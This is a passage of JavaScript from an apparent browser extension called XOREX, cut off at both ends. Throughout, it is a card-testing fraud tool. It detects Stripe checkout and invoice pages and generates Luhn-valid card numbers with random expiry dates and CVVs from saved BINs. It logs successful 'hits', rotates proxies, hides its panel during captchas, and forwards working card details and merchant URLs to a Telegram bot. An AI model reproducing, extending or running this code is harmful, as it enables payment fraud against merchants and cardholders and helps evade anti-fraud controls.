      const hasCards = hasCardFields();
      const hasSubmit = hasSubmitButton();
      if (hasCards && hasSubmit) {
        return true;
      }

      if (document.querySelector('[class*="PaymentElement"], [class*="StripeElement"], [class*="CardElement"], [class*="CheckoutPaymentForm"], form[class*="Payment"]')) {
        return true;
      }

      if (document.querySelector('[class*="App"], [id="root"], [class*="Checkout"]')) {
        return true;
      }
      return false;
    }

    if (isInvoiceStripePage()) {
      if (isInvoiceVoided()) {
        return false;
      }

      const hasCards = hasCardFields();
      const hasSubmit = hasSubmitButton();
      const hasInvoiceElements = document.querySelector('[class*="InvoicePage"], [class*="invoice"], [id="root"]');
      if ((hasCards || hasSubmit) && hasInvoiceElements) {
        return true;
      }
      if (window.location.hostname === 'invoice.stripe.com') {
        return true;
      }
    }

    const hasCards = hasCardFields();
    if (!hasCards) return false;

    const hasSubmit = hasSubmitButton();
    if (!hasSubmit) return false;

    const hasSession = hasStripeSessionInUrl();
    if (!hasSession) return false;

    const hasKeys = hasValidStripeKeys();
    if (!hasKeys) return false;

    return true;
  }
  function waitForPaymentPage(callback, maxAttempts = 40) {
    let attempts = 0;
    const check = () => {
      const hasCards = hasCardFields();
      const hasSubmit = hasSubmitButton();
      const hasSession = hasStripeSessionInUrl();
      const hasKeys = hasValidStripeKeys();

      if (isBuyStripePage()) {
        if (hasCards && hasSubmit) {
          callback(true);
          return;
        }

        if (document.querySelector('[class*="PaymentElement"], [class*="StripeElement"], [class*="CardElement"], [class*="CheckoutPaymentForm"]')) {
          callback(true);
          return;
        }

        if (document.querySelector('[class*="App"], [id="root"], [class*="Checkout"]') && attempts >= 5) {
          callback(true);
          return;
        }
      }

      if (isInvoiceStripePage()) {
        extractInvoiceData();

        if (isInvoiceVoided()) {
          callback(false);
          return;
        }

        const hasInvoiceElements = document.querySelector('[class*="InvoicePage"], [class*="invoice"], [id="root"]');
        if (hasInvoiceElements || window.location.hostname === 'invoice.stripe.com') {
          if (hasCards && hasSubmit) {
            callback(true);
            return;
          }
        }
      }

      if (hasCards && hasSubmit && hasSession && hasKeys) {
        callback(true);
      } else if (attempts < maxAttempts) {
        attempts++;
        const delay = attempts < 5 ? 200 : 150;
        setTimeout(check, delay);
      } else {
        callback(false);
      }
    };
    check();
  }

  const CURRENT_VERSION = "1.0.7";

  let isCreatingOverlay = false

  const pendingRequests = new Map()
  let requestId = 0

  function sendToBackground(message) {
    return new Promise((resolve) => {
      const id = ++requestId
      pendingRequests.set(id, resolve)

      window.postMessage({
        type: "XOREX_TO_BACKGROUND",
        requestId: id,
        payload: message
      }, "*")

      setTimeout(() => {
        if (pendingRequests.has(id)) {
          pendingRequests.delete(id)
          resolve({ success: false, error: "Request timeout" })
        }
      }, 60000)
    })
  }

  window.addEventListener("message", (event) => {
    if (event.data && event.data.type === "XOREX_FROM_BACKGROUND" && event.data.requestId) {
      const resolve = pendingRequests.get(event.data.requestId)
      if (resolve) {
        pendingRequests.delete(event.data.requestId)
        resolve(event.data.response || { success: false, error: "No response" })
      }
    }
  })

  let hasNotified = false
  let hasHit = false
  let isMinimized = false
  let isAutoSubmitting = false
  let attemptCount = 0
  let retryDelay = Math.floor(Math.random() * 500) + 500
  let cardHistory = []

  function loadCardHistory() {
    return new Promise((resolve) => {
      if (window.XOREXStorage && window.XOREXStorage.loadAllData) {
        window.XOREXStorage.loadAllData(function(data) {
          data = data || {};
          let logs = data[K.LOGS] || [];
          if (typeof logs === 'string') try { logs = JSON.parse(logs); } catch(e) { logs = []; }
          let clearedAt = data[K.LOGS_CLEARED_AT] || null;
          if (clearedAt) {
            const clearedTime = new Date(clearedAt).getTime();
            logs = logs.filter(function(l) { return new Date(l.time || l.timestamp).getTime() > clearedTime; });
          }
          if (Array.isArray(logs)) {
            cardHistory = logs;
            localStorage.setItem(K.LOGS, JSON.stringify(logs));
          }
          if (clearedAt) localStorage.setItem(K.LOGS_CLEARED_AT, clearedAt);
          resolve();
        });
        setTimeout(resolve, 3000);
        return;
      }

      let gotLogs = false;
      let gotClearedAt = false;
      let logs = [];
      let clearedAt = null;

      const handler = (event) => {
        if (event.data && event.data.type === 'XOREX_STORAGE_RESPONSE') {
          if (event.data.key === K.LOGS) {
            logs = event.data.value || [];
            if (typeof logs === 'string') {
              try { logs = JSON.parse(logs); } catch(e) { logs = []; }
            }
            gotLogs = true;
          }
          if (event.data.key === K.LOGS_CLEARED_AT) {
            clearedAt = event.data.value;
            gotClearedAt = true;
          }

          if (gotLogs && gotClearedAt) {
            window.removeEventListener('message', handler);
            if (clearedAt) {
              cardHistory = logs.filter(log => log.time && log.time > clearedAt);
            } else {
              cardHistory = logs;
            }
            resolve(cardHistory);
          }
        }
      };

      window.addEventListener('message', handler);

      setTimeout(() => {
        if (!gotLogs) {
          window.removeEventListener('message', handler);
          const localLogs = JSON.parse(localStorage.getItem(K.LOGS) || "[]");
          const localClearedAt = localStorage.getItem(K.LOGS_CLEARED_AT);
          cardHistory = localClearedAt ? localLogs.filter(log => log.time && log.time > localClearedAt) : localLogs;
          resolve(cardHistory);
        }
      }, 1000);
    });
  }

  function saveCardHistory() {
    const logsToSave = cardHistory.slice(0, 50);
    const data = {};
    data[K.LOGS] = logsToSave;
    window.postMessage({
      type: 'XOREX_STORAGE_REQUEST',
      requestId: 'logs_' + Date.now(),
      action: 'SET',
      data: data
    }, '*');
    localStorage.setItem(K.LOGS, JSON.stringify(logsToSave));
  }

  loadCardHistory().then(() => {
    if (typeof updateHistoryDisplay === 'function') {
      updateHistoryDisplay();
    }
  });

  let currentMode = "bin"
  let ccList = []
  let currentCCIndex = 0
  let isLoggedIn = false
  let userId = ""
  let userFirstName = ""
  let userPfpUrl = ""
  const DEFAULT_PFP = (() => {
    try {
      const meta = document.querySelector('meta[name="xorex-default-pfp"]');
      if (meta && meta.content) return meta.content;
    } catch (e) {}
    return "";
  })()
  let tgForwardEnabled = localStorage.getItem('xorex_tg_forward_enabled') === 'true'
  let tgBotToken = localStorage.getItem('xorex_tg_bot_token') || ""
  let tgUserId = localStorage.getItem('xorex_tg_user_id') || ""
  let proxyEnabled = localStorage.getItem('xorex_proxy_enabled') === 'true'
  let proxyList = JSON.parse(localStorage.getItem('xorex_proxy_list') || '[]')
  let proxyMode = localStorage.getItem('xorex_proxy_mode') || 'rotating'
  let currentProxyIndex = 0
  let cardFieldsDetected = false
  const notiSoundEnabled = true
  let soundVolume = 1.0
  let customName = ""
  let customEmail = ""
  let globalStorageLoaded = false

  async function sendTelegramNotification(data) {
    try {
      const attempt = data.attempt;
      if (attempt === undefined || attempt === null || attempt === 'N/A' || attempt === 0 || attempt === '0') {
        return;
      }
      if (!tgBotToken || tgBotToken.length < 10) {
        return;
      }
      if (!tgUserId || tgUserId.length < 5) {
        return;
      }

      const cardFull = data.cardNumber || 'N/A';
      const cardParts = cardFull.includes('|') ? cardFull.split('|') : [cardFull, '??', '??', '???'];
      const card = cardParts[0] || 'N/A';
      const mm = cardParts[1] || '??';
      const yy = cardParts[2] || '??';
      const cvv = cardParts[3] || '???';

      const currencySymbols = {
        'usd': '$', 'eur': '€', 'gbp': '£', 'jpy': '¥', 'cny': '¥', 'cnh': '¥',
        'inr': '₹', 'krw': '₩', 'thb': '฿', 'php': '₱', 'myr': 'RM', 'sgd': 'S$',
        'hkd': 'HK$', 'twd': 'NT$', 'idr': 'Rp', 'vnd': '₫', 'pkr': '₨', 'bdt': '৳',
        'lkr': 'Rs', 'npr': 'Rs', 'mmk': 'K', 'khr': '៛', 'lak': '₭',
        'chf': 'CHF', 'sek': 'kr', 'nok': 'kr', 'dkk': 'kr', 'pln': 'zł', 'czk': 'Kč',
        'huf': 'Ft', 'ron': 'lei', 'bgn': 'лв', 'hrk': 'kn', 'rsd': 'дин', 'uah': '₴',
        'rub': '₽', 'byn': 'Br', 'mdl': 'L', 'all': 'L', 'mkd': 'ден', 'bam': 'KM', 'isk': 'kr',
        'cad': 'C$', 'mxn': 'MX$', 'brl': 'R$', 'ars': 'AR$', 'clp': 'CL$', 'cop': 'CO$',
        'pen': 'S/', 'uyu': '$U', 'pyg': '₲', 'bob': 'Bs', 'crc': '₡', 'gtq': 'Q',
        'hnl': 'L', 'nio': 'C$', 'pab': 'B/.', 'dop': 'RD$', 'jmd': 'J$', 'ttd': 'TT$',
        'bbd': 'Bds$', 'bsd': 'B$', 'kyd': 'CI$', 'xcd': 'EC$', 'awg': 'ƒ', 'ang': 'ƒ',
        'srd': 'Sr$', 'gyd': 'G$', 'bzd': 'BZ$', 'htg': 'G',
        'aed': 'د.إ', 'sar': '﷼', 'qar': '﷼', 'omr': '﷼', 'bhd': 'BD', 'kwd': 'KD',
        'jod': 'JD', 'lbp': 'L£', 'egp': 'E£', 'ils': '₪', 'try': '₺', 'irr': '﷼',
        'iqd': 'ع.د', 'syp': '£S', 'yer': '﷼', 'zar': 'R', 'ngn': '₦', 'kes': 'KSh',
        'ugx': 'USh', 'tzs': 'TSh', 'ghs': 'GH₵', 'xof': 'CFA', 'xaf': 'FCFA', 'mad': 'DH',
        'dzd': 'DA', 'tnd': 'DT', 'lyd': 'LD', 'etb': 'Br', 'rwf': 'FRw', 'mur': 'Rs', 'scr': 'Rs',
        'aud': 'A$', 'nzd': 'NZ$', 'fjd': 'FJ$', 'pgk': 'K', 'wst': 'WS$', 'top': 'T$',
        'vuv': 'VT', 'sbd': 'SI$',
        'btc': '₿', 'eth': 'Ξ', 'xrp': 'XRP', 'ltc': 'Ł'
      };

      const currencyCode = (data.currency || 'usd').toLowerCase();
      const currencySymbol = currencySymbols[currencyCode] || currencyCode.toUpperCase() + ' ';
      const amountValue = data.amount || '0';
      const amountDisplay = `${currencySymbol}${amountValue}`;
      const attemptDisplay = String(attempt);
      const businessUrl = data.businessUrl || 'N/A';
      const successUrl = data.successUrl || businessUrl || 'N/A';
      const timeTaken = data.timeTaken || 'N/A';

      if (tgForwardEnabled && tgUserId) {
        const message = "Card: <code>" + card + "|" + mm + "|" + yy + "|" + cvv + "</code>\nEmail: <code>" + (data.email || customEmail || 'N/A') + "</code>\nAttempt: <code>" + attemptDisplay + "</code>\nAmount: <code>" + amountDisplay + "</code>\nBusiness URL: <code>" + businessUrl + "</code>\nTime: <code>" + timeTaken + "</code>\n<a href=\"" + successUrl + "\">Open Success URL</a>\nThanks For Using XOREX. ❤️";

        try {
          sendToBackground({
            type: "TELEGRAM_SEND",
            botToken: tgBotToken,
            chatId: tgUserId,
            text: message,
            disablePreview: true
          });
        } catch (msgError) {}
      }
    } catch (e) {}
  }

  function initGlobalStorage() {
    return new Promise((resolve) => {
      if (!window.XOREXStorage || !window.XOREXStorage.loadAllData) {
        globalStorageLoaded = true;
        resolve();
        return;
      }

      window.XOREXStorage.loadAllData(function(data) {
        data = data || {};

        if (data[K.SAVED_BINS]) {
          let bins = data[K.SAVED_BINS];
          if (typeof bins === 'string') try { bins = JSON.parse(bins); } catch(e) { bins = []; }
          if (Array.isArray(bins) && bins.length > 0) {
            savedBINs = [...new Set(bins)];
            localStorage.setItem(K.SAVED_BINS, JSON.stringify(savedBINs));
          }
        }

        if (data[K.BG_COLOR]) {
          pageBackgroundColor = data[K.BG_COLOR];
          localStorage.setItem(K.PAGE_BG_COLOR, data[K.BG_COLOR]);
        }
        if (data[K.PAGE_HAS_CUSTOM] !== undefined) {
          userHasSetCustomColor = data[K.PAGE_HAS_CUSTOM] === true || data[K.PAGE_HAS_CUSTOM] === 'true';
        }

        if (data[K.LOGS]) {
          let logs = data[K.LOGS];
          if (typeof logs === 'string') try { logs = JSON.parse(logs); } catch(e) { logs = []; }
          if (Array.isArray(logs)) localStorage.setItem(K.LOGS, JSON.stringify(logs));
        }
        if (data[K.LOGS_CLEARED_AT]) {
          localStorage.setItem(K.LOGS_CLEARED_AT, data[K.LOGS_CLEARED_AT]);
        }

        if (data[K.CUSTOM_NAME]) {
          customName = data[K.CUSTOM_NAME];
          localStorage.setItem(K.CUSTOM_NAME, data[K.CUSTOM_NAME]);
        }
        if (data[K.CUSTOM_EMAIL]) {
          customEmail = data[K.CUSTOM_EMAIL];
          localStorage.setItem(K.CUSTOM_EMAIL, data[K.CUSTOM_EMAIL]);
        }

        if (data[K.TOKEN]) {
          localStorage.setItem(K.TOKEN, data[K.TOKEN]);
        }
        if (data[K.USER_ID]) {
          userId = data[K.USER_ID];
          localStorage.setItem(K.USER_ID, data[K.USER_ID]);
        }
        if (data[K.FIRST_NAME]) {
          userFirstName = data[K.FIRST_NAME];
          localStorage.setItem(K.FIRST_NAME, data[K.FIRST_NAME]);
        }

        if (data[K.SAVED_ID]) {
          savedId = data[K.SAVED_ID];
          localStorage.setItem(K.SAVED_ID, data[K.SAVED_ID]);
        }

        if (data[K.HAS_CUSTOM_COLOR] !== undefined) {
          localStorage.setItem(K.HAS_CUSTOM_COLOR, data[K.HAS_CUSTOM_COLOR]);
        }

        if (data[K.BG_ENABLED] !== undefined) {
          localStorage.setItem(K.BG_ENABLED, data[K.BG_ENABLED]);
        }

        if (data[K.PAGE_BG_COLOR]) {
          localStorage.setItem(K.PAGE_BG_COLOR, data[K.PAGE_BG_COLOR]);
        }

        tgForwardEnabled = false;
        if (data[K.TOGGLE_HIT_SOUND] !== undefined) {
          localStorage.setItem(K.TOGGLE_HIT_SOUND, data[K.TOGGLE_HIT_SOUND]);
        }
        if (data[K.TOGGLE_AUTO_SS] !== undefined) {
          localStorage.setItem(K.TOGGLE_AUTO_SS, data[K.TOGGLE_AUTO_SS]);
        }

        if (data[K.MUSIC_NAME]) {
          localStorage.setItem(K.MUSIC_NAME, data[K.MUSIC_NAME]);
        }

        if (data[K.CARD_HISTORY]) {
          let hist = data[K.CARD_HISTORY];
          if (typeof hist === 'string') try { hist = JSON.parse(hist); } catch(e) { hist = []; }
          if (Array.isArray(hist)) localStorage.setItem(K.CARD_HISTORY, JSON.stringify(hist));
        }

        if (data[K.LAST_SEEN_BIN_TIME]) {
          localStorage.setItem(K.LAST_SEEN_BIN_TIME, data[K.LAST_SEEN_BIN_TIME]);
        }

        globalStorageLoaded = true;
        resolve();
      });

      setTimeout(() => {
        if (!globalStorageLoaded) {
          globalStorageLoaded = true;
          resolve();
        }
      }, 3000);
    });
  }

  function saveToGlobalStorage(key, value) {
    const data = {};
    data[key] = value;
    window.postMessage({ type: 'XOREX_STORAGE_REQUEST', requestId: 'save_' + Date.now(), action: 'SET', data: data }, '*');
    localStorage.setItem(key, typeof value === 'object' ? JSON.stringify(value) : value);
  }

  initGlobalStorage();

  function loadCustomNameEmail() {
    return new Promise((resolve) => {
      if (window.XOREXStorage && window.XOREXStorage.loadAllData) {
        window.XOREXStorage.loadAllData(function(data) {
          data = data || {};
          customName = data[K.CUSTOM_NAME] || localStorage.getItem(K.CUSTOM_NAME) || "";
          customEmail = data[K.CUSTOM_EMAIL] || localStorage.getItem(K.CUSTOM_EMAIL) || "";
          resolve({ name: customName, email: customEmail });
        });
        setTimeout(() => resolve({ name: customName, email: customEmail }), 2000);
      } else {
        customName = localStorage.getItem(K.CUSTOM_NAME) || "";
        customEmail = localStorage.getItem(K.CUSTOM_EMAIL) || "";
        resolve({ name: customName, email: customEmail });
      }
    });
  }

  function saveCustomName(name) {
    customName = name;
    localStorage.setItem(K.CUSTOM_NAME, name);
    if (window.XOREXStorage && window.XOREXStorage.saveCustomName) {
      window.XOREXStorage.saveCustomName(name);
    }
  }

  function saveCustomEmail(email) {
    customEmail = email;
    localStorage.setItem(K.CUSTOM_EMAIL, email);
    if (window.XOREXStorage && window.XOREXStorage.saveCustomEmail) {
      window.XOREXStorage.saveCustomEmail(email);
    }
  }

  loadCustomNameEmail().then(({ name, email }) => {
    const nameInput = document.getElementById('customNameInput');
    const emailInput = document.getElementById('customEmailInput');
    if (nameInput) nameInput.value = name;
    if (emailInput) emailInput.value = email;
  });

  let isMusicPlaying = false
  const autoSSEnabled = true
  const autoSubmitInterval = null
  let savedBINs = []
  let currentBinIndex = 0
  let savedId = ""
  let binBlurTimeout, idBlurTimeout
  let successStartTime = null
  let cardAttemptStartTime = null
  const extractedPaymentData = {
    cardNumber: "",
    bin: "",
    amount: "0",
    currency: "",
    email: "",
    businessUrl: "",
    successUrl: "",
  }
  let paymentDataFound = false
    window.addEventListener('storage', function(e) {
    if (e.key === K.LOGS) {
      const logs = JSON.parse(e.newValue || '[]')
      const logsClearedAt = localStorage.getItem(K.LOGS_CLEARED_AT)
      cardHistory = logsClearedAt ? logs.filter(log => log.time && log.time > logsClearedAt) : logs
      if (typeof updateHistoryDisplay === 'function') {
        updateHistoryDisplay()
      }
    }
    if (e.key === K.LOGS_CLEARED_AT && e.newValue) {
      cardHistory = []
      if (typeof updateHistoryDisplay === 'function') {
        updateHistoryDisplay()
      }
    }
    if (e.key === K.PAGE_BG_COLOR) {
      pageBackgroundColor = e.newValue || DEFAULT_BG_COLOR
      applyCustomStyles()
      const input = document.getElementById('pageBgColorInput')
      if (input) input.value = pageBackgroundColor
    }
  })

  function getSavedBIN() {
    if (savedBINs.length === 0) {
      const stored = localStorage.getItem(K.SAVED_BINS)
      if (stored) {
        try {
          savedBINs = JSON.parse(stored)
        } catch (e) {
          const oldBin = localStorage.getItem(K.SAVED_BINS)
          if (oldBin) savedBINs = [oldBin]
        }
      }
    }
    return savedBINs[currentBinIndex] || savedBINs[0] || ""
  }
  function saveBINs(bins) {
    savedBINs = [...new Set(bins.filter((b) => b && b.length >= 6))]
    localStorage.setItem(K.SAVED_BINS, JSON.stringify(savedBINs))
    if (window.XOREXStorage && window.XOREXStorage.saveBINs) {
      window.XOREXStorage.saveBINs(savedBINs);
    }
  }
  function switchBin() {
    if (savedBINs.length <= 1) return
    currentBinIndex = (currentBinIndex + 1) % savedBINs.length
    const newBin = savedBINs[currentBinIndex]
    showWarning(`Bin Switch To: ${newBin}`, "info")
    updateBinStatus()

    updateSelectedBinHighlight(true)
  }
  function getSavedId() {
    return savedId || localStorage.getItem(K.USER_ID) || ""
  }
  function saveID(id) {
    savedId = id
    localStorage.setItem(K.USER_ID, id)
    if (window.XOREXStorage && window.XOREXStorage.saveId) {
      window.XOREXStorage.saveId(id);
    }
    window.postMessage({ type: "SAVE_ID", id: id }, "*")
  }
  function saveToggleState(toggleType, value) {
    localStorage.setItem("xorex_toggle_" + toggleType, value)
    if (window.XOREXStorage && window.XOREXStorage.saveToggleState) {
      window.XOREXStorage.saveToggleState(toggleType, value);
    }
    window.postMessage(
      {
        type: "SAVE_TOGGLE_STATE",
        toggleType: toggleType,
        value: value,
      },
      "*",
    )
  }
  function generateLuhn(number) {
    function calculateSum(num) {
      let sum = 0
      let isEven = false
      for (let i = num.length - 1; i >= 0; i--) {
        let digit = Number.parseInt(num[i])
        if (isEven) {
          digit *= 2
          if (digit > 9) digit -= 9
        }
        sum += digit
        isEven = !isEven
      }
      return sum
    }
    for (let i = 0; i < 10; i++) {
      const testNumber = number + i
      if (calculateSum(testNumber) % 10 === 0) {
        return i
      }
    }
    return 0
  }
  function isAmex(bin) {
    const prefix = bin.replace(/[^0-9]/g, "").substring(0, 2)
    return prefix === "34" || prefix === "37"
  }
  function generateCard(bin) {
    if (!bin) return null
    let binPattern = bin
    let monthPattern = null
    let yearPattern = null
    let cvvPattern = null
    if (bin.includes("|")) {
      const parts = bin.split("|")
      binPattern = parts[0]
      monthPattern = parts[1] || null
      yearPattern = parts[2] || null
      cvvPattern = parts[3] || null
    }
    binPattern = binPattern.replace(/[^0-9xX]/g, "")
    let cardNumber = ""
    for (const c of binPattern) {
      cardNumber += c === "x" || c === "X" ? Math.floor(Math.random() * 10) : c
    }
    const targetLength = isAmex(binPattern) ? 15 : 16
    const remainingLength = targetLength - cardNumber.length - 1
    for (let i = 0; i < remainingLength; i++) {
      cardNumber += Math.floor(Math.random() * 10)
    }
    const checkDigit = generateLuhn(cardNumber)
    const fullCard = cardNumber + checkDigit
    const month = generateMonth(monthPattern)
    const year = generateYear(yearPattern)
    const cvv = generateCvv(cvvPattern, fullCard)
    return { card: fullCard, month, year, cvv }
  }
  function generateMonth(pattern) {
    if (!pattern) return randomMonth()
    pattern = pattern.trim()
    if (pattern === "xx" || pattern === "XX") return randomMonth()
    const monthNum = parseInt(pattern)
    if (monthNum >= 1 && monthNum <= 12) {
      return String(monthNum).padStart(2, "0")
    }
    return randomMonth()
  }
  function generateYear(pattern) {
    if (!pattern) return randomYear()
    pattern = pattern.trim()
    if (pattern === "xx" || pattern === "XX") return randomYear()
    const yearNum = parseInt(pattern)
    if (yearNum >= 0 && yearNum <= 99) {
      return String(yearNum).padStart(2, "0")
    }
    if (yearNum >= 2000 && yearNum <= 2099) {
      return String(yearNum).slice(-2)
    }
    return randomYear()
  }
  function generateCvv(pattern, card) {
    if (!pattern) return randomCvv(card)
    pattern = pattern.trim().toUpperCase()
    const isAmexCard = isAmex(card || "")
    const cvvLength = isAmexCard ? 4 : 3

    if (pattern === "RND" || pattern === "RANDOM" || pattern === "XXXX" || pattern === "XXX" || pattern === "XX") {
      return randomCvv(card)
    }
    let cvv = ""
    for (const c of pattern) {
      cvv += c === "X" ? Math.floor(Math.random() * 10) : c
    }
    if (cvv.length < cvvLength) {
      cvv = cvv.padStart(cvvLength, "0")
    }
    return cvv.substring(0, cvvLength)
  }
  function randomMonth() {
    const now = new Date()
    const currentMonth = now.getMonth() + 1
    const currentYear = now.getFullYear()
    const futureYear = currentYear + Math.floor(Math.random() * 6) + 1
    const m =
      futureYear === currentYear
        ? Math.floor(Math.random() * (12 - currentMonth + 1)) + currentMonth
        : Math.floor(Math.random() * 12) + 1
    return String(m).padStart(2, "0")
  }
  function randomYear() {
    const currentYear = new Date().getFullYear()
    return String(currentYear + Math.floor(Math.random() * 6) + 1).slice(-2)
  }
  function randomCvv(card) {
    return isAmex(card || "")
      ? String(Math.floor(Math.random() * 10000)).padStart(4, "0")
      : String(Math.floor(Math.random() * 1000)).padStart(3, "0")
  }
  function updateBinStatus() {
    const binStatus = document.getElementById("binStatus")
    const bin = getSavedBIN()
    if (binStatus) {
      if (bin) {
        const binInfo =
          savedBINs.length > 1
            ? `BIN ${currentBinIndex + 1}/${savedBINs.length}: ${bin.substring(0, 6)}...`
            : `BIN: ${bin.substring(0, 6)}...`
        binStatus.textContent = binInfo
        binStatus.classList.remove("hidden")
        binStatus.classList.add("success")
      } else {
        binStatus.textContent = ""
        binStatus.classList.add("hidden")
        binStatus.classList.remove("success")
      }
    }
  }
  function loadSavedBins() {
    const stored = localStorage.getItem(K.SAVED_BINS);
    if (stored) {
      try {
        const parsed = JSON.parse(stored);
        if (Array.isArray(parsed) && parsed.length > 0) {
          savedBINs = [...new Set(parsed)];
        }
      } catch (e) {
        const oldBin = localStorage.getItem(K.SAVED_BINS);
        if (oldBin) savedBINs = [oldBin];
      }
    }
    populateBinInputs();

    if (window.XOREXStorage && window.XOREXStorage.loadSavedBINs) {
      window.XOREXStorage.loadSavedBINs(function(chromeBins) {
        if (Array.isArray(chromeBins) && chromeBins.length > 0) {
          if (chromeBins.length >= savedBINs.length) {
            savedBINs = [...new Set(chromeBins)];
          }
          localStorage.setItem(K.SAVED_BINS, JSON.stringify(savedBINs));
          populateBinInputs();
          updateSwitchBtnVisibility();
        }
      });
    }
  }

  function populateBinInputs() {
    const container = document.getElementById("binInputsContainer");
    if (container && savedBINs.length > 0) {
      const existingExtraRows = container.querySelectorAll(".bin-input-row:not(:first-child)");
      existingExtraRows.forEach((row) => row.remove());
      const firstInput = document.getElementById("binInput1");
      if (firstInput) firstInput.value = savedBINs[0] || "";
      for (let i = 1; i < savedBINs.length; i++) {
        const newRow = document.createElement("div");
        newRow.className = "bin-input-row";
        newRow.innerHTML = `
        <input type="text" class="input-field bin-input" placeholder="input bin" maxlength="30" value="${savedBINs[i]}">
        <button class="remove-bin-btn" title="Remove">−</button>
      `;
        container.appendChild(newRow);
        newRow.querySelector(".remove-bin-btn").addEventListener("click", () => {
          newRow.remove();
          const inputs = document.querySelectorAll(".bin-input");
          const remaining = Array.from(inputs).map(i => i.value.trim()).filter(b => b && b.length >= 6);
          if (remaining.length > 0) {
            saveBINs(remaining);
            currentBinIndex = Math.min(currentBinIndex, savedBINs.length - 1);
            updateBinStatus();
          }
          updateSwitchBtnVisibility();
        });
      }

      updateSelectedBinHighlight(false);
    }
    updateSwitchBtnVisibility();
  }

  function updateSelectedBinHighlight(animate = false) {
    const allRows = document.querySelectorAll(".bin-input-row");
    allRows.forEach((row, index) => {
      row.classList.remove("bin-selected");
      const input = row.querySelector(".bin-input");
      if (input) {
        input.classList.remove("bin-input-selected");
      }
    });

    if (allRows.length > 0 && currentBinIndex < allRows.length) {
      const selectedRow = allRows[currentBinIndex];
      if (selectedRow) {

        if (animate) {
          selectedRow.style.animation = 'none';
          selectedRow.offsetHeight;
          selectedRow.style.animation = '';
        }
        selectedRow.classList.add("bin-selected");
        const input = selectedRow.querySelector(".bin-input");
        if (input) {
          input.classList.add("bin-input-selected");
        }
      }
    }
  }

  function updateSwitchBtnVisibility() {
    const switchBtn = document.getElementById("switchBinBtn")
    const inputs = document.querySelectorAll(".bin-input")
    const filledInputs = Array.from(inputs).filter((i) => i.value.trim().length >= 6)
    if (switchBtn) {
      if (filledInputs.length > 1 || savedBINs.length > 1) {
        switchBtn.classList.remove("hidden")
      } else {
        switchBtn.classList.add("hidden")
      }
    }
  }
  function updateIdStatus() {
    const idStatus = document.getElementById("idStatus")
    const id = getSavedId()
    if (idStatus) {
      if (id) {
        idStatus.textContent = "ID: " + id.substring(0, 4) + "..."
        idStatus.classList.remove("hidden")
        idStatus.classList.add("success")
      } else {
        idStatus.textContent = ""
        idStatus.classList.add("hidden")
        idStatus.classList.remove("success")
      }
    }
  }
  function toggleMinimize(e) {
    const overlay = document.querySelector(".card-generator-overlay")
    const minimizeBtn = document.getElementById("minimizeBtn")
    if (overlay) {
      isMinimized = !isMinimized
      overlay.classList.toggle("minimized", isMinimized)
      if (minimizeBtn) {
        minimizeBtn.innerHTML = isMinimized ? "✦" : "»"
        minimizeBtn.title = isMinimized ? "Open panel" : "Close panel"
      }

      wasAutoHiddenByCaptcha = false;
      dashboardStateBeforeCaptcha = null;
    }
    if (e) e.stopPropagation()
  }

  function autoHideDashboardForCaptcha() {
    const overlay = document.querySelector(".card-generator-overlay")
    if (!overlay || !isDashboardActive) return;

    if (!isMinimized) {

      dashboardStateBeforeCaptcha = {
        wasMinimized: isMinimized,
        timestamp: Date.now()
      };
      wasAutoHiddenByCaptcha = true;

      isMinimized = true;
      overlay.classList.add("minimized");
      const minimizeBtn = document.getElementById("minimizeBtn");
      if (minimizeBtn) {
        minimizeBtn.innerHTML = "✦";
        minimizeBtn.title = "Open panel (auto-hidden for captcha)";
      }

    }
  }

  function restoreDashboardAfterCaptcha() {
    const overlay = document.querySelector(".card-generator-overlay")
    if (!overlay || !isDashboardActive) return;

    if (wasAutoHiddenByCaptcha && dashboardStateBeforeCaptcha) {

      const timePassed = Date.now() - dashboardStateBeforeCaptcha.timestamp;
      if (timePassed < 5 * 60 * 1000) {

        if (!dashboardStateBeforeCaptcha.wasMinimized) {
          isMinimized = false;
          overlay.classList.remove("minimized");
          const minimizeBtn = document.getElementById("minimizeBtn");
          if (minimizeBtn) {
            minimizeBtn.innerHTML = "»";
            minimizeBtn.title = "Close panel";
          }

        }
      }

      wasAutoHiddenByCaptcha = false;
      dashboardStateBeforeCaptcha = null;
    }
  }

  let wasAutoMinimizedForModal = false;

  function autoMinimizeForModal() {
    const overlay = document.querySelector(".card-generator-overlay");
    if (!overlay || !isDashboardActive) return;

    if (!isMinimized) {
      wasAutoMinimizedForModal = true;
      isMinimized = true;
      overlay.classList.add("minimized");
      const minimizeBtn = document.getElementById("minimizeBtn");
      if (minimizeBtn) {
        minimizeBtn.innerHTML = "✦";
        minimizeBtn.title = "Open panel";
      }
    }
  }

  function autoRestoreAfterModal() {
    const overlay = document.querySelector(".card-generator-overlay");
    if (!overlay || !isDashboardActive) return;

    if (wasAutoMinimizedForModal && isMinimized) {
      isMinimized = false;
      overlay.classList.remove("minimized");
      const minimizeBtn = document.getElementById("minimizeBtn");
      if (minimizeBtn) {
        minimizeBtn.innerHTML = "»";
        minimizeBtn.title = "Close panel";
      }
    }
    wasAutoMinimizedForModal = false;
  }

  let lastToastMessage = ""
  let lastToastTime = 0
  const TOAST_DEBOUNCE_MS = 1500
  function showWarning(message, type = "info") {
    const now = Date.now()
    if (message === lastToastMessage && now - lastToastTime < TOAST_DEBOUNCE_MS) {
      return
    }
    lastToastMessage = message
    lastToastTime = now
    if (type === "info") {
      if (
        message.includes("✅") ||
        message.includes("success") ||
        message.includes("Success") ||
        message.includes("saved") ||
        message.includes("Saved")
      ) {
        type = "success"
      } else if (
        message.includes("❌") ||
        message.includes("error") ||
        message.includes("Error") ||
        message.includes("Decline") ||
        message.includes("decline") ||
        message.includes("failed")
      ) {
        type = "error"
      }
    }
    const cleanMessage = message.replace(/^[✅❌⚠️ℹ️🎉]\s*/, "").trim()
    const icons = {
      success: "✓",
      error: "!",
      info: "i",
    }
    const existing = document.querySelector(".warning-toast")
    if (existing) {
      existing.classList.remove("show")
      existing.classList.add("hide")
      setTimeout(() => existing.remove(), 400)
    }
    const warning = document.createElement("div")
    warning.className = "warning-toast " + type
    warning.style.willChange = 'transform, opacity'
    warning.innerHTML =
      '<div class="toast-icon-wrapper">' +
      '<span class="toast-icon">' +
      icons[type] +
      "</span>" +
      "</div>" +
      '<div class="warning-content">' +
      cleanMessage +
      "</div>"
    document.body.appendChild(warning)
    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        warning.classList.add("show")
      })
    })
    setTimeout(() => {
      if (warning.parentNode) {
        warning.classList.remove("show")
        warning.classList.add("hide")
        setTimeout(() => warning.remove(), 400)
      }
